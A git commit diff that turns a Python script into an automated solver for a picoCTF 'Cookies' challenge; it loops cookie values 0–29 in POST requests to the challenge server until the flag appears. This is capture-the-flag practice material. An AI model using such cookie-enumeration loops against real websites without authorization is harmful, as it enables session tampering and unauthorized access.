70ae87bf629b1d136ce44ffe0b48253b2b3393b3
Tristan Gomez <gomez22@pdx.edu>
2021-08-10 16:44:16 -0700

    changed cookies.py to programatically solve the ctf

--- picoGym/cookies/cookies.py
+++ picoGym/cookies/cookies.py
@@ -4,14 +4,33 @@ import requests
 
 s = requests.Session()
 
+i = 0
+
 exploit_data = {
     'name' : 'snickerdoodle'
 }
 
 exploit_cookie = {
-    'name' : '18'
+    'name' : f'{i}'
 }
 
 resp = s.post("http://mercury.picoctf.net:21485/search", cookies=exploit_cookie, data=exploit_data)
+if('picoCTF{' in resp.text):
+        print(resp.status_code)
+        print(resp.text)
+else:
+    i += 1
+    while(i < 30):
+        exploit_data = {
+            'name' : 'snickerdoodle'
+        }
 
-print(resp.text)
+        exploit_cookie = {
+            'name' : f'{i}'
+        }   
+
+        resp = s.post("http://mercury.picoctf.net:21485/search", cookies=exploit_cookie, data=exploit_data)
+        if('picoCTF{' in resp.text):
+            print(resp.text)
+            break   
+        i += 1
